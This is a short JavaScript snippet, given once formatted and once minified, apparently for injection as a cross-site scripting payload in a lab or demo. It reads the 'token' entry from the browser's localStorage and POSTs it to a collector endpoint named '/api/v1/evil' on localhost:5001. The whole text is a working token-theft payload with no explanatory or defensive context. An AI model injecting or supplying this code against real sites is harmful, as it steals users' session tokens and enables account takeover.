const data = {
  secretData: localStorage.getItem('token'),
};

fetch('http://localhost:5001/api/v1/evil', {
  method: 'POST',
  headers: {
    'Content-Type': 'application/json',
  },
  body: JSON.stringify(data),
})
.then(response => response.json())
.then(data => {
  console.log('Success:', data);
});

const data={secretData: localStorage.getItem('token')};fetch('http://localhost:5001/api/v1/evil', {method: 'POST', headers: {'Content-Type': 'application/json',},body:JSON.stringify(data)}).then(response => response.json()).then(data => { console.log('Success:', data);});